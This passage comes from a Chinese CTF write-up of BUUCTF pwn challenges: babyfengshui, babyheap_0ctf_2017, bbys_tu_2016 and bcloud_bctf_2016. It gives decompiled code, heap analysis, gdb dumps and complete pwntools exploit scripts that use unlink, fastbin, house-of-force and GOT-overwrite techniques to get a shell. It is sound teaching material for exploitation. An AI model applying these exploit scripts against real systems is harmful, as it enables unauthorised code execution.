p.sendlineafter(&quot;:&quot;,str(idx)) p.sendlineafter(&quot;:&quot;,str(sz)) p.sendlineafter(&quot;:&quot;,text)def delete(idx): p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;2&quot;) p.sendlineafter(&quot;:&quot;,str(idx))def edit(idx,text): p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;4&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) p.sendlineafter(&quot;:&quot;,text)if __name__ == &#x27;__main__&#x27;: p.sendlineafter(&quot;:&quot;,&quot;%14$p-%15$p&quot;) p.recvuntil(&quot;Hello, &quot;) axb_leak = int(p.recv(14),16) p.recvuntil(&quot;-&quot;) libc_leak = int(p.recv(14),16) axb_base = axb_leak-0x1200 libc_base = libc_leak-0x20830 bss_addr = axb_base+0x202060 sys_addr = libc_base+libc.sym[&quot;system&quot;] free_addr = libc_base+libc.sym[&quot;__free_hook&quot;] success(&quot;axb base=&gt;0x%x&quot;,axb_leak) success(&quot;libc base=&gt;0x%x&quot;,libc_base) success(&quot;bss addr=&gt;0x%x&quot;,bss_addr) success(&quot;system addr=&gt;0x%x&quot;,sys_addr) success(&quot;free addr=&gt;0x%x&quot;,free_addr) add(0,0x98,&#x27;0&#x27;*0x98) add(1,0x98,&#x27;1111&#x27;) add(2,0x90,&#x27;2222&#x27;) add(3,0x90,&#x27;/bin/sh\\x00&#x27;) # fake chunk fake.sz fake.fd fake.bk repair payload=p64(0)+p64(0x91)+p64(bss_addr-0x18)+p64(bss_addr-0x10)+p64(0)*14+p64(0x90)+&#x27;\\xa0&#x27; edit(0,payload) #gdb.attach(p) delete(1) #free fake chunk #gdb.attach(p) edit(0,p64(0)*3+p64(free_addr)+p64(0x10))#in fake chunks #gdb.attach(p) edit(0,p64(sys_addr))#free-&gt;got #gdb.attach(p) delete(3) p.interactive() babyfengshui_33c3_2016 1.checksec 123456[*] &#x27;/home/joe1sn/Documents/ctf/questions/BUUCTF/pwn/babyfengshui_33c3_2016/babyfengshui&#x27; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) RELRO: Partial RELRO可以改写GOT表 2.IDA main 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758void __cdecl __noreturn main()&#123; char v0; // [esp+3h] [ebp-15h] int v1; // [esp+4h] [ebp-14h] size_t v2; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); alarm(0x14u); while ( 1 ) &#123; puts(&quot;0: Add a user&quot;); puts(&quot;1: Delete a user&quot;); puts(&quot;2: Display a user&quot;); puts(&quot;3: Update a user description&quot;); puts(&quot;4: Exit&quot;); printf(&quot;Action: &quot;); if ( __isoc99_scanf(&quot;%d&quot;, &amp;v1) == -1 ) break; if ( !v1 ) &#123; printf(&quot;size of description: &quot;); // size of chunk __isoc99_scanf(&quot;%u%c&quot;, &amp;v2, &amp;v0); add_usr(v2); &#125; if ( v1 == 1 ) &#123; printf(&quot;index: &quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v2); delet_usr(v2); &#125; if ( v1 == 2 ) &#123; printf(&quot;index: &quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v2); display(v2); &#125; if ( v1 == 3 ) &#123; printf(&quot;index: &quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v2); text_rewrite(v2); &#125; if ( v1 == 4 ) &#123; puts(&quot;Bye&quot;); exit(0); &#125; if ( (unsigned __int8)byte_804B069 &gt; 0x31u ) &#123; puts(&quot;maximum capacity exceeded, bye&quot;); exit(0); &#125; &#125; exit(1);&#125; add_usr 12345678910111213141516_DWORD *__cdecl add_usr(size_t a1)&#123; void *s; // ST24_4 _DWORD *v2; // ST28_4 s = malloc(a1); // 申请的description大小 memset(s, 0, a1); v2 = malloc(0x80u); memset(v2, 0, 0x80u); // v2的大小为0x80 *v2 = s; ptr[(unsigned __int8)byte_804B069] = v2; // 将指针保存至指针数组中 printf(&quot;name: &quot;); sub_80486BB((char *)ptr[(unsigned __int8)byte_804B069] + 4, 0x7C);// fgets 0x7个字符 text_rewrite(++byte_804B069 - 1); // 写入text return v2;&#125; 函数首先分配一个description的最大空间，让你后再分配给user结构体的空间，并将user放入store数组中，最后调用更新decription的函数 123456struct user&#123; char *desc; char name[0x7c];&#125;user;struct user *store[]; store放在0x804b080，当前user个数user_num放在0x804b069（byte_804B069） https://blog.csdn.net/qinying001/article/details/104359401 可以从这篇文章看堆的情况，这里我大致画一下 1234#codeadd_user(0x80, 0x80, &#x27;AAAA&#x27;) # 0add_user(0x80, 0x80, &#x27;AAAA&#x27;) # 1 add_user(0x8, 0x8, &#x27;/bin/sh\\x00&#x27;) # 2 1234567=========================================|| chunk0_desc 0x80 | chunk0_node 0x80 ||=========================================|| chunk1_desc 0x80 | chunk1_node 0x80 ||=========================================|| chunk2_desc 0x8 | chunk2_node 0x8 || ========================================= 12#codedelete_user(0) 1234567=========================================|| freed_chunk 0x100 ||=========================================|| chunk1_desc 0x80 | chunk1_node 0x80 ||=========================================|| chunk2_desc 0x8 | chunk2_node 0x8 || ========================================= 12#codeadd_user(0x100, 0x19c, &quot;A&quot;*(0x100+0x80+0x8+0x10) + p32(elf.got[&#x27;free&#x27;])) # 0 *desc-&gt;free_got 123456789=======================|| chunk0_desc 0x100 || &lt;--first fit规则符合=========================================|| chunk1_desc 0x80 | chunk1_node 0x80 ||=========================================|| chunk2_desc 0x8 | chunk2_node 0x8 || =========================================|| chunk0_node 0x80 || &lt;--被重新分配======================= 所以我们首先添加两个user，用于绕过检查。 第3个user存放&quot;/bin/sh&quot;。 然后删 掉第1个user，并创建一个description很长的user，其长度是第1个user的description长度加上user结构体长度。这时候检查就绕了，我们可以在添加新user的时候修改description大小，造成堆溢出，并修改第2个user的user&gt;desc为free@got.plt，从而泄漏出libc地址。 得到system地址后，此时修 改第2个user的description，其实是修free的GOT，所以我们将其改成，system@got.plt。 最后删除第3个user，触发system(‘/bin/sh’)，得到shell ​ ------《ctf_all_in_one》 3.EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *context.log_level = &#x27;debug&#x27;io = process(&#x27;./babyfengshui&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)#io = remote(&quot;node3.buuoj.cn&quot;,29784)elf = ELF(&#x27;babyfengshui&#x27;)libc = ELF(&#x27;libc-2.23.so&#x27;) def add_user(size, length, text): io.sendlineafter(&quot;Action: &quot;, &#x27;0&#x27;) io.sendlineafter(&quot;description: &quot;, str(size)) io.sendlineafter(&quot;name: &quot;, &#x27;AAAA&#x27;) io.sendlineafter(&quot;length: &quot;, str(length)) io.sendlineafter(&quot;text: &quot;, text) def delete_user(idx): io.sendlineafter(&quot;Action: &quot;, &#x27;1&#x27;) io.sendlineafter(&quot;index: &quot;, str(idx)) def display_user(idx): io.sendlineafter(&quot;Action: &quot;, &#x27;2&#x27;) io.sendlineafter(&quot;index: &quot;, str(idx)) def update_desc(idx, length, text): io.sendlineafter(&quot;Action: &quot;, &#x27;3&#x27;) io.sendlineafter(&quot;index: &quot;, str(idx)) io.sendlineafter(&quot;length: &quot;, str(length)) io.sendlineafter(&quot;text: &quot;, text)def GDB(): context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;] gdb.attach(io)if __name__ == &quot;__main__&quot;: add_user(0x80, 0x80, &#x27;AAAA&#x27;) # 0 add_user(0x80, 0x80, &#x27;AAAA&#x27;) # 1 add_user(0x8, 0x8, &#x27;/bin/sh\\x00&#x27;) # 2 delete_user(0) add_user(0x100, 0x19c, &quot;A&quot;*(0x100+0x80+0x8+0x10) + p32(elf.got[&#x27;free&#x27;])) # 0 display_user(1) io.recvuntil(&quot;description: &quot;) free_addr = u32(io.recvn(4)) system_addr = free_addr - (libc.symbols[&#x27;free&#x27;] - libc.symbols[&#x27;system&#x27;]) log.info(&quot;system address: 0x%x&quot; % system_addr) update_desc(1, 0x4, p32(system_addr)) #desc-&gt;[free]&lt;-system delete_user(2) #free(*desc)--&gt;system(&quot;/bin/sh\\x00&quot;) io.interactive() babyheap_0ctf_2017 1.checksec 123456[*] &#x27;/home/joe1sn/Documents/ctf/questions/BUUCTF/pwn/babyheap_0ctf_2017/babyheap_0ctf_2017&#x27; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 2.IDA main 123456789101112131415161718192021222324252627282930__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; __int64 v4; // [rsp+8h] [rbp-8h] v4 = sub_B70(a1, a2, a3); while ( 1 ) &#123; menu(); input(); // input switch ( (unsigned __int64)off_14F4 ) &#123; case 1uLL: Allocate(v4); break; case 2uLL: Fill(v4); break; case 3uLL: Free(v4); break; case 4uLL: Dump(v4); break; case 5uLL: return 0LL; default: continue; &#125; &#125;&#125; Fill 1234567891011121314151617181920212223242526__int64 __fastcall Fill(__int64 a1)&#123; __int64 result; // rax int v2; // [rsp+18h] [rbp-8h] int v3; // [rsp+1Ch] [rbp-4h] printf(&quot;Index: &quot;); result = input(); v2 = result; if ( (signed int)result &gt;= 0 &amp;&amp; (signed int)result &lt;= 15 ) &#123; result = *(unsigned int *)(24LL * (signed int)result + a1); if ( (_DWORD)result == 1 ) &#123; printf(&quot;Size: &quot;); result = input(); v3 = result; if ( (signed int)result &gt; 0 ) &#123; printf(&quot;Content: &quot;); result = sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3); &#125; &#125; &#125; return result;&#125; 没有检查堆是否溢出 Free 12345678910111213141516171819202122__int64 __fastcall Free(__int64 a1)&#123; __int64 result; // rax int v2; // [rsp+1Ch] [rbp-4h] printf(&quot;Index: &quot;); result = input(); v2 = result; if ( (signed int)result &gt;= 0 &amp;&amp; (signed int)result &lt;= 15 ) &#123; result = *(unsigned int *)(24LL * (signed int)result + a1); if ( (_DWORD)result == 1 ) &#123; *(_DWORD *)(24LL * v2 + a1) = 0; *(_QWORD *)(24LL * v2 + a1 + 8) = 0LL; free(*(void **)(24LL * v2 + a1 + 16)); result = 24LL * v2 + a1; *(_QWORD *)(result + 16) = 0LL; &#125; &#125; return result;&#125; 没有system,leak libc + malloc_hook(无法修改GOT表) one_gadget 1234567891011121314150x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: rax == NULL0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints: [rsp+0x70] == NULL main_arena_offset 123[+]libc version : glibc 2.23[+]build ID : BuildID[sha1]=1ca54a6e0d76188105b12e49fe6b8019bf08803a[+]main_arena_offset : 0x3c4b20 3.GDB 3.1 libc leak 一般采取堆块重叠后，free()加入unsorted bin最后dump出unsorted bin的地址，根据libc中与main_arena的偏移得到libc_base 123456789101112131415161718#code:Allocate(0x60)Allocate(0x30)Fill(0,&quot;a&quot;*0x60+p64(0)+p64(0x71)) &lt;--修改idx=1的chunks sizeAllocate(0x100) #idx=2 &lt;--堆重叠了Fill(2,&quot;a&quot;*0x20+p64(0)+p64(0x71)) &lt;--idx=2的BK_nextsize位修改Free(1) &lt;--加入fastbin链表（free()的还是0x30大小）Allocate(0x60)#idx=1 &lt;--堆溢出Fill(1,&quot;a&quot;*0x30+p64(0)+p64(0x111))&lt;--堆修复Allocate(0x60)#idx=3 &lt;--和top_chunk分隔Free(2)GDB()leak = u64(Dump(1)[-25:-17])print &quot;leak:&quot;+hex(leak)base=leak-0x3c4b78malloc_hook=base+libc.sym[&#x27;__malloc_hook&#x27;]print hex(malloc_hook) 1234567gef➤ heap chunksChunk(addr=0x55754fefb010, size=0x70, flags=PREV_INUSE) [0x000055754fefb010 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 aaaaaaaaaaaaaaaa]Chunk(addr=0x55754fefb080, size=0x70, flags=PREV_INUSE) [0x000055754fefb080 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 aaaaaaaaaaaaaaaa]Chunk(addr=0x55754fefb0f0, size=0x70, flags=PREV_INUSE) [0x000055754fefb0f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................] 1234───────────── Unsorted Bin for arena &#x27;main_arena&#x27; ─────────────[+] unsorted_bins[0]: fw=0x55754fefb0b0, bk=0x55754fefb0b0 → Chunk(addr=0x55754fefb0c0, size=0x110, flags=PREV_INUSE)[+] Found 1 chunks in unsorted bin. 1234567891011121314151617181920212223gef➤ x/45gx 0x55de8a8640000x55de8a864000: 0x0000000000000000 0x00000000000000710x55de8a864010: 0x6161616161616161 0x61616161616161610x55de8a864020: 0x6161616161616161 0x61616161616161610x55de8a864030: 0x6161616161616161 0x61616161616161610x55de8a864040: 0x6161616161616161 0x61616161616161610x55de8a864050: 0x6161616161616161 0x61616161616161610x55de8a864060: 0x6161616161616161 0x61616161616161610x55de8a864070: 0x0000000000000000 0x00000000000000710x55de8a864080: 0x6161616161616161 0x61616161616161610x55de8a864090: 0x6161616161616161 0x61616161616161610x55de8a8640a0: 0x6161616161616161 0x61616161616161610x55de8a8640b0: 0x0000000000000000 0x00000000000001110x55de8a8640c0: 0x00007fa305c4ab78 0x00007fa305c4ab78 &lt;---unsorted bin0x55de8a8640d0: 0x0000000000000000 0x00000000000000000x55de8a8640e0: 0x0000000000000000 0x00000000000000710x55de8a8640f0: 0x0000000000000000 0x00000000000000000x55de8a864100: 0x0000000000000000 0x00000000000000000x55de8a864110: 0x0000000000000000 0x00000000000000000x55de8a864120: 0x0000000000000000 0x00000000000000000x55de8a864130: 0x0000000000000000 0x00000000000000000x55de8a864140: 0x0000000000000000 0x00000000000000000x55de8a864150: 0x0000000000000000 0x0000000000000000 3.2 fastbin attack 最后再修改malloc_hook-35的地址（mallco_hook的参数要偏移，且偏移后的地址不能为0）为exec_binsh(one_gadget) 简言之就是hook-&gt;onegadget 1234567#code:Free(1)Fill(0,&quot;a&quot;*0x60+p64(0)+p64(0x71)+p64(malloc_hook-35)+p64(0))GDB()#堆溢出覆盖chunk1的fd,使得下一块chunk在malloc_hook-35的地方Allocate(0x60)GDB() 3.4 覆盖chunk1的fd heap 1234567891011121314151617181920212223242526272829303132330x55a4b068b000 FASTBIN &#123; &lt;---chunk 0 prev_size = 0, size = 113, fd = 0x6161616161616161, bk = 0x6161616161616161, fd_nextsize = 0x6161616161616161, bk_nextsize = 0x6161616161616161&#125;0x55a4b068b070 FASTBIN &#123; &lt;---chunk1 prev_size = 0, size = 113, fd = 0x7f038a23caed &lt;_IO_wide_data_0+301&gt;, malloc_hook-35 bk = 0x0, fd_nextsize = 0x6161616161616161, bk_nextsize = 0x6161616161616161&#125;0x55a4b068b0e0 FASTBIN &#123; prev_size = 0, size = 113, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;0x55a4b068b150 &#123; prev_size = 0, size = 0, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125; bins 1234567891011121314fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x7ff5da1deaed (_IO_wide_data_0+301) ◂— 0xf5d9e9fe200000000x80: 0x0unsortedbinall: 0x0smallbinsemptylargebinsempty stack 123456789pwndbg&gt; x/gx 0x7ff5da1deb10-35 0x7ff5da1deaed &lt;_IO_wide_data_0+301&gt;: 0xf5da1dd260000000 0x7ff5da1deaf5 &lt;_IO_wide_data_0+309&gt;: 0x000000000000007f 0x7ff5da1deafd: 0xf5d9e9fe20000000 0x7ff5da1deb05 &lt;__memalign_hook+5&gt;: 0xf5d9e9fa0000007f 0x7ff5da1deb0d &lt;__realloc_hook+5&gt;: 0x000000000000007f 0x7ff5da1deb15 &lt;__malloc_hook+5&gt;: 0x0000000000000000 0x7ff5da1deb1d: 0x0000000000000000 0x7ff5da1deb25 &lt;main_arena+5&gt;: 0x0000000000000000 3.5 填入onegadget heap 12345678910111213141516171819202122232425262728293031320x55efd712d000 FASTBIN &#123; prev_size = 0, size = 113, fd = 0x6161616161616161, bk = 0x6161616161616161, fd_nextsize = 0x6161616161616161, bk_nextsize = 0x6161616161616161&#125;0x55efd712d070 FASTBIN &#123; prev_size = 0, size = 113, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;0x55efd712d0e0 FASTBIN &#123; prev_size = 0, size = 113, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;0x55efd712d150 &#123; prev_size = 0, size = 0, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125; gdb 1234567pwndbg&gt; x/gx 0x7f0f7c16ab10-350x7f0f7c16aaed &lt;_IO_wide_data_0+301&gt;: 0x0f7c169260000000 0x7f0f7c16aaf5 &lt;_IO_wide_data_0+309&gt;: 0x000000000000007f0x7f0f7c16aafd: 0x41414141414141410x7f0f7c16ab05 &lt;__memalign_hook+5&gt;: 0x41414141414141410x7f0f7c16ab0d &lt;__realloc_hook+5&gt;: 0x0f7bdeb26a4141410x7f0f7c16ab15 &lt;__malloc_hook+5&gt;: 0x000000000000007f 120x7f0f7bda6000+0x4526a=0x7f0f7bdeb26a =0x7f0f7c16ab0d &lt;__realloc_hook+5&gt;的数值 4.EXP 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from pwn import *context.log_level = &#x27;debug&#x27;#p = remote(&quot;node3.buuoj.cn&quot;,26611)libc = ELF(&quot;./libc-2.23.so&quot;)p = process(&quot;./babyheap_0ctf_2017&quot;)def Allocate(size): p.sendlineafter(&quot;Command: &quot;,&quot;1&quot;) p.sendlineafter(&quot;Size: &quot;,str(size))def Fill(idx,content): p.sendlineafter(&quot;Command: &quot;,&quot;2&quot;) p.sendlineafter(&quot;Index: &quot;,str(idx)) p.sendlineafter(&quot;Size: &quot;,str(len(content))) p.sendlineafter(&quot;Content: &quot;,content)def Free(idx): p.sendlineafter(&quot;Command: &quot;,&quot;3&quot;) p.sendlineafter(&quot;Index: &quot;,str(idx))def Dump(idx): p.recvuntil(&quot;Command:&quot;) p.sendline(&quot;4&quot;) p.recvuntil(&quot;Index:&quot;) p.sendline(str(idx)) p.recvuntil(&#x27;Content: \\n&#x27;) return p.recvline()def GDB(): context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;] gdb.attach(p)Allocate(0x60)Allocate(0x30)Fill(0,&quot;a&quot;*0x60+p64(0)+p64(0x71))Allocate(0x100)Fill(2,&quot;a&quot;*0x20+p64(0)+p64(0x71))Free(1)Allocate(0x60)Fill(1,&quot;a&quot;*0x30+p64(0)+p64(0x111))Allocate(0x60)Free(2)print Dump(1)leak = u64(Dump(1)[-25:-17])print &quot;leak:&quot;+hex(leak)base=leak-0x3c4b78malloc_hook=base+libc.sym[&#x27;__malloc_hook&#x27;]print hex(malloc_hook)Free(1)Fill(0,&quot;a&quot;*0x60+p64(0)+p64(0x71)+p64(malloc_hook-35)+p64(0))Allocate(0x60)Allocate(0x60)Fill(2,&quot;A&quot;*(35-8-8)+p64(base+0x4526a))Allocate(0x10)p.interactive() bbys_tu_2016 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA main 123456789int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [esp+14h] [ebp-Ch] puts(&quot;This program is hungry. You should feed it.&quot;); __isoc99_scanf(&quot;%s&quot;, &amp;v4); puts(&quot;Do you feel the flow?&quot;); return 0;&#125; printFlag 1234567891011int printFlag()&#123; char s; // [esp+1Ah] [ebp-3Eh] FILE *stream; // [esp+4Ch] [ebp-Ch] stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;); fgets(&amp;s, 50, stream); puts(&amp;s); fflush(stdout); return fclose(stream);&#125; 简单栈溢出 3.EXP 12345678910from pwn import *context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,28634)elf = ELF(&quot;./bbys_tu_2016&quot;)print_flag=elf.sym[&quot;printFlag&quot;]payload = &#x27;a&#x27;*(0xc+8+4)+p32(print_flag)p.sendline(payload)print p.recv()p.interactive() bcloud_bctf_2016 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA sub_80487A1 12345678910111213141516unsigned int sub_80487A1()&#123; char s; // [esp+1Ch] [ebp-5Ch] char *v2; // [esp+5Ch] [ebp-1Ch] unsigned int v3; // [esp+6Ch] [ebp-Ch] v3 = __readgsdword(0x14u); memset(&amp;s, 0, 0x50u); puts(&quot;Input your name:&quot;); safe_read((int)&amp;s, 0x40, 10); v2 = (char *)malloc(0x40u); dword_804B0CC = (int)v2; strcpy(v2, &amp;s); start_line((int)v2); return __readgsdword(0x14u) ^ v3;&#125; s的最大为0x40，v2最大也为0x40 sub_8048779 12345int __cdecl sub_8048779(int a1)&#123; printf(&quot;Hey %s! Welcome to BCTF CLOUD NOTE MANAGE SYSTEM!\\n&quot;, a1); return puts(&quot;Now let&#x27;s set synchronization options.&quot;);&#125; 这里就可以泄露 v2 指针的地址 sub_804884E 1234567891011121314151617181920212223unsigned int sub_804884E()&#123; char s; // [esp+1Ch] [ebp-9Ch] char *v2; // [esp+5Ch] [ebp-5Ch] int v3; // [esp+60h] [ebp-58h] char *v4; // [esp+A4h] [ebp-14h] unsigned int v5; // [esp+ACh] [ebp-Ch] v5 = __readgsdword(0x14u); memset(&amp;s, 0, 0x90u); puts(&quot;Org:&quot;); safe_read((int)&amp;s, 0x40, &#x27;\\n&#x27;); puts(&quot;Host:&quot;); safe_read((int)&amp;v3, 0x40, &#x27;\\n&#x27;); v4 = (char *)malloc(0x40u); v2 = (char *)malloc(0x40u); dword_804B0C8 = (int)v2; dword_804B148 = (int)v4; strcpy(v4, (const char *)&amp;v3); strcpy(v2, &amp;s); puts(&quot;OKay! Enjoy:)&quot;); return __readgsdword(0x14u) ^ v5;&#125; 因为这里是32位程序，而且 s 和 v2 的栈空间相差64，刚好可以覆盖 v2 的低地。然后到这一步的话， top chunk 又刚好在 v2 的下方，strcpy(v2, &amp;s);将0x40个字符 + v2 地址 + v3 内容一同复制进v2可以通过溢出覆盖 top chunk 的 size域，符合了 HOF 的第一个条件 能够以溢出等方式控制到 top chunk 的 size 域 12345678+-------------+----+--------------------------------+| 0000009C s | s | safe_read((int)&amp;s, 0x40, &#x27;\\n&#x27;);|+---------------------------------------------------+| 0000005C | v2 | v2 = (char *)malloc(0x40u); |+---------------------------------------------------+| 00000058 | v3 |safe_read((int)&amp;v3, 0x40, &#x27;\\n&#x27;);|+---------------------------------------------------+ strcpy(v2, &amp;s); 3.思路 利用初始化名字处的漏洞泄漏堆的基地址。。 利用 house of force 将 top chunk 分配至全局的 0x0804B0A0 的 &amp;notesize-8 处，当再次申请内存时，便返回notesize地址处的内存，从而我们就可以控制所有note的大小以及对应的地址了。 修改前三个 note 的大小为16，并修改其指针为 free@got，notesize，libc_start 将 free@got 修改为 puts@plt。 泄漏 libc_start 地址。 再次修改另外一个 free@got 项为 system 地址，从而拿到shell。 4.gdb 0x1 leak_addr 123450x804c000: 0x0000004900000000 0x61616161616161610x804c010: 0x6161616161616161 0x61616161616161610x804c020: 0x6161616161616161 0x61616161616161610x804c030: 0x6161616161616161 0x61616161616161610x804c040: 0x6161616161616161 0x00020f000804c008 0x00020f000804c008发现距离地址相差 8，所以之后要去减去 1234567891011121314151617181920212223242526#code: sh.sendafter(&quot;Input your name:\\n&quot;,&#x27;a&#x27;*0x40) sh.recvuntil(&#x27;a&#x27;*0x40) leak = u32(sh.recv(4)) - 8 log.success(&quot;leak addr &gt; 0x%x&quot;,leak) gdb.attach(sh)#gdb0x9e89000: 0x0000004900000000 0x61616161616161610x9e89010: 0x6161616161616161 0x61616161616161610x9e89020: 0x6161616161616161 0x61616161616161610x9e89030: 0x6161616161616161 0x61616161616161610x9e89040: 0x6161616161616161 0x00020f0009e890080x9e89050: 0x0000000000000000 0x0000000000000000#gefgef➤ heap chunksChunk(addr=0x9e89008, size=0x48, flags=PREV_INUSE)··········································Chunk(addr=0x9e89050, size=0x48, flags=PREV_INUSE)··········································Chunk(addr=0x9e89098, size=0x48, flags=PREV_INUSE)··········································Chunk(addr=0x9e890e0, size=0x20e70, flags=PREV_INUSE) ← top chunk··········································#计算&gt;&gt;&gt;hex(0x9e890e0 - 0x9e89008)0xd8 #得到top_chunk相对偏移 0x2 hof 12345678910111213141516171819202122232425262728#code: sh.sendafter(&quot;Org:\\n&quot;,&#x27;a&#x27;*64) sh.sendlineafter(&quot;Host:\\n&quot;,p32(0xffffffff)) log.success(&quot;top chunk &gt; 0x%x&quot;,top_chunk)#gdb0x9e89008: 0x6161616161616161 0x61616161616161610x9e89018: 0x6161616161616161 0x61616161616161610x9e89028: 0x6161616161616161 0x61616161616161610x9e89038: 0x6161616161616161 0x61616161616161610x9e89048: 0x0000004909e89008 0x00000000ffffffff0x9e89058: 0x0000000000000000 0x00000000000000000x9e89068: 0x0000000000000000 0x00000000000000000x9e89078: 0x0000000000000000 0x00000000000000000x9e89088: 0x0000000000000000 0x00000049000000000x9e89098: 0x6161616161616161 0x61616161616161610x9e890a8: 0x6161616161616161 0x61616161616161610x9e890b8: 0x6161616161616161 0x61616161616161610x9e890c8: 0x6161616161616161 0x61616161616161610x9e890d8: 0xffffffff09e89098 0x00000000000000000x9e890e8: 0x0000000000000000 0x00000000000000000x9e890f8: 0x0000000000000000 0x0000000000000000#gefgef➤ heap chunksChunk(addr=0x9e89008, size=0x48, flags=PREV_INUSE)Chunk(addr=0x9e89050, size=0x48, flags=PREV_INUSE)Chunk(addr=0x9e89098, size=0x48, flags=PREV_INUSE)Chunk(addr=0x9e890e0, size=0xfffffff8, flags=PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA) ← top chunk top chunk 的 size域被改变了 0x3 迁移top chunk 1234567891011121314151617181920#code: notesize_addr = 0x0804B0A0 notelist_addr = 0x0804B120 target = notesize_addr - 8 offset = target - top_chunk - 8 log.success(&quot;offset &gt; &quot;+hex(offset)) add(offset,&quot;aaaa&quot;)#terminal[+] 1st chunk addr &gt; 0x9f8c000[+] top chunk &gt; 0x9f8c0d8[+] offset &gt; -0x1f41048#pwndbg0x804b098 PREV_INUSE &#123; prev_size = 0, size = 32772153, fd = 0xfe0befb8, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125; 发现多了这个 chunk ，地址=notesize_addr - 8 说明迁移成功，那么下一次就会分配chunk到这里来 0x4 free@got泄露 12345678910#code: payload = p32(16) * 3 payload += (notelist_addr - notesize_addr - 12) * &#x27;a&#x27; payload += p32(elf.got[&#x27;free&#x27;]) + p32(elf.got[&#x27;atoi&#x27;]) * 2 add(1000,payload)#pwndbg0x804b098: 0x00000000 0x01f41039 0xfe0befb8 0x000000000x804b0a8: 0x00000000 0x00000000 0x00000000 0x000000000x804b0b8: 0x00000000 0x00000000 0x00000000 0x000000000x804b0c8: 0x09f8c098 0x09f8c008 0x00000000 0x00000000 5.EXP 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768from pwn import *#context.log_level = &quot;debug&quot;context.arch = &quot;i386&quot;elf = ELF(&quot;./bcloud_bctf_2016&quot;)libc = ELF(&quot;/home/joe1sn/libc/32/libc-2.23.so&quot;)sh = remote(&quot;node3.buuoj.cn&quot;,29429)def add(size,text): sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;1&quot;) sh.sendlineafter(&quot;:&quot;,str(size)) if size &gt; 0: sh.recvuntil(&quot;:&quot;) sh.send(text)def edit(idx,text): sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;3&quot;) sh.sendlineafter(&quot;:&quot;,str(idx)) sh.sendafter(&quot;:&quot;,text)def delete(idx): sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;4&quot;) sh.sendlineafter(&quot;:&quot;,str(idx))if __name__ == &#x27;__main__&#x27;:#------------------leak------------------ sh.sendafter(&quot;:&quot;,&quot;b&quot; * 0x40) sh.recvuntil(&quot;b&quot; * 0x40) heap_base = u32(sh.recv(4)) - 8 top_chunk = heap_base + 0xd8 log.success(&quot;1st chunk &gt; &quot;+hex(heap_base)) log.success(&quot;top chunk &gt; &quot;+hex(top_chunk))#------------------hof------------------ sh.recvuntil(&quot;:&quot;) sh.send(0x40 * &quot;a&quot;) sh.recvuntil(&quot;:&quot;) sh.sendline(&quot;\\xff&quot; * 0x4)#------------------top chunk------------------ notesize_addr = 0x0804B0A0 notelist_addr = 0x0804B120 offset = notesize_addr - top_chunk - 0x10 add(offset,&#x27;&#x27;)#------free@got,atoi@got,atoi@got------ payload = p32(0x400) * 10 payload = payload.ljust(0x0804B120 - 0x0804B0A0,&#x27;\\x00&#x27;) payload += p32(elf.got[&#x27;free&#x27;]) payload += p32(notesize_addr) payload += p32(elf.got[&#x27;__libc_start_main&#x27;]) add(0x400,payload + &quot;\\n&quot;) edit(0,p32(elf.plt[&#x27;puts&#x27;]) + &quot;\\n&quot;) delete(2)#------------------leak all------------------ __libc_start_main = u32(sh.recvuntil(&#x27;\\xf7&#x27;)[-4:]) base = __libc_start_main - libc.symbols[&#x27;__libc_start_main&#x27;] system = base + libc.symbols[&#x27;system&#x27;] binsh = base + libc.search(&quot;/bin/sh\\x00&quot;).next() log.success(&#x27;libc base addr: &#x27; 